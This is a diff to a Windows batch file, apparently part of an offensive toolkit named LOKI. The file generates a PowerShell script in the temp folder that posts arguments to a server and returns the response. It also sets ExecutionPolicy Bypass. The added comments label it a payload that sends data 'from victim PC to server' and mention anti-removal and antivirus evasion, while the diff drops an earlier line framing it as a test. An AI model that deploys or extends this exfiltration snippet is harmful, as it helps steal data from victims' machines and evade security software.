@@ -1,13 +1,13 @@
+REM ----------------------------------------------------------------------------------------------------
 REM Author: MAZZONI ROBERTO
-REM Language : LOKI PowerShell and Command Line Test
-REM ---------------------------------------------------------------------------------------
-REM SEND POST DATA TO SERVER
-REM ---------------------------------------------------------------------------------------
+REM Payload Snippet: SEND API/POST , SEND DATA FROM VICTIM PC TO SERVER AND GET/ANALYZE RESULT OUTPUT
+REM Title : LOKI PowerShell and Command Line
+REM ---------------------------------------------------------------------------------------------------
 REM AUTOGENERATE POWERSHELL CODE - ANTIREMOVE
 REM OUTPUT PS1 FILE: temp\STS.ps1 , rename it....
 REM FROM AV EVASION ADD RANDOM PROGRAM LINE
-REM USEFUL FOR DATA EXFILTRATION TEST
 
+REM Start Snippet...
 set sendPS=%TMP%\STS.ps1
 echo $apikey=$args[0]>%sendPS%
 echo $c=$args[1]>>%sendPS%
@@ -21,8 +21,10 @@ echo    "data_c" = $c;>>%sendPS%
 echo    "data_d" = $z>>%sendPS%
 echo	}>>%sendPS%
 echo $response = Invoke-RestMethod -Uri $URL -Body $Body -Method POST>>%sendPS%
+REM ---------------------------------------------------------------------------------------------------
 echo echo $response>>%sendPS%
-REM ----------------------------------------------------------------------------------------
+REM ---------------------------------------------------------------------------------------------------
+REM End Snippet...
 
 
 set powerPolicy=-ExecutionPolicy Bypass
